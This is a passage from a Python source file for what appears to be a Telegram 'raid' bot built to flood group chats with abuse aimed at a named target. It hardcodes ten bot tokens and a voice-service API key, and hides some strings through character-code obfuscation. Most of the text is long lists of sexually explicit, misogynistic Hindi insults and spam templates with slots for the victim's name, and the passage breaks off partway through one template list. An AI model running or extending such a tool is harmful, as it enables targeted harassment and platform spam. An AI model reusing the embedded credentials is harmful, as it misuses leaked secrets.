import asyncio
import json
import os
import random
import time
import logging
import requests
import io
from datetime import datetime
from telegram import Update, ReactionTypeEmoji, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import RetryAfter
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

_z = lambda *v: "".join(map(chr, v))
_X0 = _z(126,97,109,97,110,107,101,110,103)
_X1 = _z(126,97,109,97,110,107,101,110,103,118,49)
_X2 = _z(126,97,109,97,110,107,101,110,103,118,50)
_X3 = _z(126,97,109,97,110,107,101,110,103,118,51)

# ---------------------------
# CONFIG
# ---------------------------
TOKENS = [ "8216498300:AAGRV_6gpLmFgnzBht4ekyHKaySFp3D1SHc",

"8981644551:AAFCE4W6Gl6W-wFyyGtRu_VoXb3pQHbkTH8",

"8675825327:AAHYx0FL0_2HOkUv97Gs9Xtrr3DBD2fXtlM",

"8720462812:AAFUSo5b8r3M47vTCrZFKqV5fqcUq5-LAco",

"8902413695:AAH78di6k8Io6YjfVILMGE_0_T2Ik10euZk",

"8904714335:AAHANHEZGeNCkYsvElhZ2xxBfH7lk1eVx-A",

"8595841159:AAF9I6o8zfSVVRLfKChNHtIthLafbmGywUc",

"8862118309:AAEwcBndBnShIEKhByQ0utOBB3Laro8I8dQ",

"8814006053:AAHpbHbZ22kc-EOlwVa8_YwcGpjY__gbsyg",

"8412545069:AAGHG_Yz4zMyyG33uezVmGcZ4FpLgU-aEgc",
]

OWNER_IDS = [8854714402]
ADMINS_FILE = "admin_ids.json"
GROUPS_FILE = "monitored_groups.json"
SUDO_FILE = "sudo.json"

GOJO_DOMAIN_VIDEO_URL = "https://files.catbox.moe/jomgdq.mp4"
MENU1_VIDEO_URL = "https://files.catbox.moe/5ialhg.mp4"
MENU2_VIDEO_URL = "https://files.catbox.moe/4tne0w.mp4"
HATER_GAME_OVER_VIDEO_URL = "https://files.catbox.moe/5xd21o.mp4"
MENU3_VIDEO_URL = "https://files.catbox.moe/glyi6j.mp4"
SUKUNA_DOMAIN_VIDEO_URL = "https://files.catbox.moe/yasb2f.mp4"
MENU4_VIDEO_URL = "https://files.catbox.moe/dh1j2v.mp4"
MENU5_VIDEO_URL = "https://files.catbox.moe/sy7m58.mp4"
MENU6_VIDEO_URL = "https://files.catbox.moe/53f3fz.mp4"
MENU7_VIDEO_URL = "https://files.catbox.moe/thttgm.mp4"
MENU8_VIDEO_URL = "https://files.catbox.moe/ug02xi.mp4"
MENU9_VIDEO_URL = "https://files.catbox.moe/nrrkxc.mp4"
MENU10_VIDEO_URL = "https://files.catbox.moe/4tne0w.mp4"

UNAUTHORIZED_MESSAGE = "𝐁ɪɴᴀ devil𝐁ᴀᴀᴘ 𝐊 𝐏ᴇʀᴍɪꜱꜱɪᴏɴ 𝐊 𝐂ᴏᴍᴍᴀɴᴅ 𝐊ᴇꜱᴇ 𝐔ꜱᴇ 𝐊ᴀʀᴀ 𝐑ɴᴅʏᴋᴇ 𝐁ᴀᴄᴄʜᴇ ~😡🖕"

RAID_TEXTS = [
    "𝐒ᴀʏ devil𝐃ᴀᴅʏ 𓆩💗𓆪",
    "𝐖ᴏ ʙʜɪ ᴋʏᴀ ᴅɪɴ ᴛʜᴇ ᴊᴀʙ ᴛʀʏ ᴍᴀᴀ ᴍᴜᴊʜᴇ 𝐀ᴘɴᴀ 𝐂ʜᴜᴛ 𝐃ᴇᴛɪ ᴛʜɪ ʏᴀᴀʀ 💔🥀👌🏻",
    "𝐀ᴡᴀᴢ 𝐍ɪᴄʜᴇ 𝐆ᴜʟᴀᴀᴍ 🤢👇🏻",
    "𝐓ʀʏ 𝐌ᴀᴀ ɴᴇ 𝐂ʜᴜᴅɴᴇ 𝐌ᴀɪ ɢᴏʟᴅ 𝐌ᴇᴅᴀʟ 𝐉ᴇᴇᴛᴀ ᴇʏ 𝐃ᴏꜱᴛ 🤩👑",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐌ᴇʀᴀ 𝐋ᴜɴᴅ 🖕🏻😈",
    "𝐁ʜᴏꜱᴀᴅɪᴋᴇ 𝐀ᴘɴɪ 𝐁ᴇʜᴇɴ 𝐂ʜᴜᴅᴀ 🖕🏻😈",
    "𝐑ᴀɴᴅɪ ᴋᴇ 𝐁ᴀᴄᴄʜᴇ 𝐀ᴜᴋᴀᴛ 𝐌ᴇ 𝐑ᴇʜ 🖕🏻😈",
    "𝐌ᴀᴅᴀʀᴄʜᴏᴅ 𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 🖕🏻😈",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋᴀ 𝐁ʜᴏꜱᴅᴀ ᴋʜᴏʟ ᴅᴜɴɢᴀ 🔓😈",
    "𝐁ʜᴇɴᴄʜᴏᴅ 𝐀ᴘɴɪ 𝐀ᴜᴋᴀᴛ 𝐌ᴇ 𝐑ᴇʜ 🤡💩",
    "𝐓𝐌𝐊𝐂 ᴘᴇ 𝐂ʜᴀᴘᴘᴀʟ 𝐌ᴀᴀʀᴜɴɢᴀ 👟💥",
    "𝐁ʜᴏꜱᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐊ʜᴀɴᴅᴀɴ ᴋɪ 𝐁𝐊𝐂 💀🖕🏻",
    "𝐑ᴀɴᴅɪ ᴋɪ 𝐀ᴜʟᴀᴅ ᴄʜᴜᴘ ʜᴏ ᴊᴀ 🔇😒",
    "𝐆ᴜʟᴀᴀᴍ ʜᴇɪ ᴛᴜ ᴍᴇʀᴀ ᴀʙ ᴀᴜʀ ʀᴀʜᴇɢᴀ ʙʜɪ 👑😎",
    "𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐌ɪʀᴄʜɪ 🌶️🖕🏻",
    "𝐌ᴀᴅᴀʀᴄʜᴏᴅ 𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐏ᴀɪʀ 🦶🏻😈",
    "𝐁ʜᴏꜱᴀᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴋᴀ 𝐁ʜᴏꜱᴅᴀ 🗑️😏",
    "𝐑ᴀɴᴅɪ ᴋᴀ 𝐏ɪʟʟᴀ ʜᴀɪ ᴛᴜ 🐕💩",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋᴏ 𝐁ᴀᴢᴀᴀʀ 𝐌ᴇ 𝐂ʜᴏᴅᴜɴɢᴀ 🌃😈",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐆ᴀʀᴀᴍ 𝐓ᴇʟ 🌡️🖕🏻",
    "𝐌ᴀᴅᴀʀᴄʜᴏᴅ 𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴍᴇʀɪ 𝐑ᴀɴᴅɪ 💋👿",
    "𝐑ᴀɴᴅɪ ᴋᴇ 𝐁ᴀᴄᴄʜᴇ 𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 🖕🏻😈",
    "𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴋᴏ 𝐑ᴀᴀᴛ ʙʜᴀʀ 𝐂ʜᴏᴅᴜɴɢᴀ 🌙😈",
    "𝐑ᴀɴᴅɪ ᴋᴀ 𝐁ᴀᴄᴄʜᴀ ʜᴀɪ ᴛᴜ ꜱᴀᴀʟᴇ 🤡💀",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐌ᴇʀᴀ 𝐉ᴏᴏᴛᴀ 👞🖕🏻",
    "devil𝐃ᴀᴅʏ ᴋᴀ 𝐆ᴜʟᴀᴀᴍ ʜᴀɪ ᴛᴜ 🥀😤",
    "ᴊɪꜱ ᴅɪɴ ᴛᴜ ᴘᴀɪᴅᴀ ʜᴜᴀ 𝐓ᴇʀɪ 𝐌ᴀᴀ ɴᴇ ꜱᴏᴄʜᴀ ᴛʜᴀ ᴋᴀꜱʜ ᴀʙᴏʀᴛ ᴋᴀʀ ᴅᴇᴛɪ 💀🥀",
    "𝐀ᴘɴɪ 𝐀ᴜᴋᴀᴛ ᴅᴇᴋʜ ᴋᴜᴛᴛᴇ 🐕😂",
    "𝐆ᴀʟɪ ᴋᴀ 𝐊ᴜᴛᴛᴀ ʜᴀɪ ᴛᴜ 🐕🗑️",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ɴᴇ ᴍᴜᴊʜᴇ ᴅᴇᴋʜ ᴋᴇ ꜱᴏᴄʜᴀ ᴋᴀꜱʜ ʏᴇ ᴍᴇʀᴀ ʙᴇᴛᴀ ʜᴏᴛᴀ 🫦😏",
    "𝐂ʜᴜᴘ ᴋᴀʀ 𝐌ᴀᴅᴀʀᴄʜᴏᴅ ᴛᴇʀɪ ᴀᴜᴋᴀᴛ ɴᴀʜɪ ᴍᴇʀᴇ ꜱᴀᴀᴍɴᴇ ʙᴏʟɴᴇ ᴋɪ 🤐💀",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴅᴀɪ ᴍᴇ ᴊᴀʙ ᴍᴀɪ ᴛʜᴀ ᴛᴏ ᴛᴜ ᴘᴀɪᴅᴀ ʜᴜᴀ 💀😂",
    "𝐁ʜᴀɢ ʏᴀʜᴀɴ ꜱᴇ ᴋᴜᴛᴛᴇ ᴋᴇ ᴘɪʟʟᴇ 🐕💨",
    "𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴋɪ ꜱᴀᴅɪ 𝐌ᴇ ᴍᴇʀᴀ ʟᴜɴᴅ 💍😈",
    "𝐌ᴀᴅᴀʀᴄʜᴏᴅ ᴀᴘɴɪ 𝐌ᴀᴀ ᴍᴀᴛ ᴄʜᴜᴅᴀ 🖕🏻👹",
    "𝐁ʜᴇɴᴄʜᴏᴅ 𝐓ᴇʀɪ 𝐊ʜᴀɴᴅᴀɴ ᴋɪ 𝐁𝐊𝐂 💀🖕🏻",
    "𝐁𝐊𝐂 🦴🐕",
]

NCEMO_EMOJIS = [
    "🗿","👑","🩵","🔱","🌷","❤️‍🩹","👞","🤮","🤣","😭","💔","🥺",
    "😁","👿","🚀","🔥","🥹","😬","🙄","😎","👽","👾","😈","👹",
    "🤡","👋🏿","🤞🏿","🙀","👌🏿","🤟🏿","🐒","🦁","🐅","🦓","🐮"
]

FLAGNC_EMOJIS = [
    "🇮🇳", "🇵🇰", "🇦🇫", "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇩🇪", "🇫🇷", "🇮🇹", "🇯🇵", "🇰🇷", "🇧🇷", "🇷🇺", "🇿🇦", "🇲🇽", "🇪🇸", "🇸🇦", "🇹🇷", "🇮🇩"
]

HEARTNC_EMOJIS = [
    "❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "🤍", "🤎", "💔", "❤️‍🔥", "❤️‍🩹", "❣️", "💕", "💞", "💓", "💗", "💖", "💘", "💝"
]

AESTHETICNC_EMOJIS = [
    "🕊️", "🤍", "🌸", "🎀", "🦢", "🐚", "🩰", "☁️", "✨", "🧊", "🎐", "💎", "🦋", "🍃", "🧸"
]

VEGETABLENC_EMOJIS = [
    "🥬", "🥦", "🌽", "🥕", "🫑", "🥒", "🍆", "🍅", "🥔", "🧄", "🧅", "🥜", "🫒"
]

ANIMALNC_EMOJIS = [
    "🐶", "🐱", "🐭", "🐹", "🐰", "🦊", "🐻", "🐼", "🐨", "🐯", "🦁", "🐮", "🐷", "🐸", "🐵", "🐒", "🐔", "🐧", "🐦", "🐤"
]

NC9_EMOJIS = ["🥱","😱","🤨","😒","😡","🤬","😤","😮‍💨","🥵","🥶","🤢","🤮","🫩","😈","👿","👽","🧃","🧋","🗻","🃏","💠","🇦🇨","🇦🇩","🇦🇪","🇦🇫","🇦🇬","🇦🇮","🇦🇱","🇦🇲","🇦🇴","🇦🇶","🇦🇷","🇦🇸","🇦🇹","🇦🇺","🇦🇼","🇧🇦","🇧🇶","🇧🇱","🇧🇫","🇨🇮","🇨🇩","🇨🇦","🇨🇿","🇩🇯","🇨🇭","🇪🇬","🇨🇨","🇧🇯","🇧🇶","🇰🇿","🇰🇼","🇰🇳","🇲🇭","🇲🇪","🇲🇬","🇰🇳","🇮🇴","🇯🇵","🇷🇺","🇳🇺","🇵🇬","🇸🇩","🇵🇷","🇵🇳","🇵🇭","🇳🇫","🇳🇪","🇺🇾","🇺🇸","🇻🇪","🌊","🌬️","❄️","🌀","🌪️","⚡","☔","🌈","💧","☁️","🌨️","🌧️","🌩️","⛈️","🌦️","🌥️","⛅","🌤️","☀️","🌞","🌝","🌚","🌜","🌛","🌙","⭐","🌟","✨","🪐","🌑","🌒","🌓","🌔","🌕","🌖","🌗","🌘"]

NC9_WORDS = [
    "𝙈𝘼𝘿𝘼𝙍𝘾𝙃⭕𝘿𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫🩷𒐫𒐫𒐫",
]

NC9_PATTERN = "❮{emoji}❯ {target} {word} ❮{emoji}❯"

EXONC_TEXTS = ["💀", "🔥", "⚡", "🎯", "💥", "👑", "🔱", "💫", "⭐", "🌟", "✨", "🎀", "❤️", "🖤"]

VOICE_CHARACTERS = {
    1: {"name": "Urokodaki", "voice_id": "VR6AewLTigWG4xSOukaG"},
    2: {"name": "Kanae", "voice_id": "EXAVITQu4vr4xnSDxMaL"},
    3: {"name": "Uppermoon", "voice_id": "AZnzlk1XvdvUeBnXmlld"},
    4: {"name": "Tanjiro", "voice_id": "VR6AewLTigWG4xSOukaG"},
    5: {"name": "Nezuko", "voice_id": "EXAVITQu4vr4xnSDxMaL"},
    6: {"name": "Zenitsu", "voice_id": "AZnzlk1XvdvUeBnXmlld"},
    7: {"name": "Inosuke", "voice_id": "VR6AewLTigWG4xSOukaG"},
    8: {"name": "Muzan", "voice_id": "AZnzlk1XvdvUeBnXmlld"},
    9: {"name": "Shinobu", "voice_id": "EXAVITQu4vr4xnSDxMaL"},
    10: {"name": "Giyu", "voice_id": "VR6AewLTigWG4xSOukaG"}
}
tempest_API_KEY = "sk_e326b337242b09b451e8f18041fd0a7149cc895648e36538"

ALL_NC_TEXT = "devil 𝐃𝐀𝐃𝐃𝐘"
ALL_SPAM_TEXT = "𝐓𝐄𝐑𝐈 𝐌𝐀𝐀 𝐊𝐈 𝐂𝐇𝐔𝐓 𝐌𝐄 𝐏𝐀𝐈𝐑 𝐌ᴇ𝐑𝐀 🔥⚡"

SPAM_TEMPLATE = [
    "━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀ𝐫 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀ𝐫 𝐒ʜ𝐀ɪ𝐓ᴀ𝐧𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀ𝐫 𝐒ʜ𝐀ɪ𝐓ᴀ𝐧𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀ𝐫 𝐒ʜ𝐀ɪ𝐓ᴀ𝐧𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀ𝐫 𝐒ʜ𝐀ɪ𝐓ᴀ𝐧𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀ𝐫 𝐒ʜ𝐀ɪ𝐓ᴀ𝐧𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀ𝐫 𝐒ʜ𝐀ɪ𝐓ᴀ𝐧𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀ𝐫 𝐒ʜ𝐀ɪ𝐓ᴀ𝐧𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀ𝐫 𝐒ʜ𝐀ɪ𝐓ᴀ𝐧𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━",
    "🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻_____________\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻___________🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻_________________🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________",
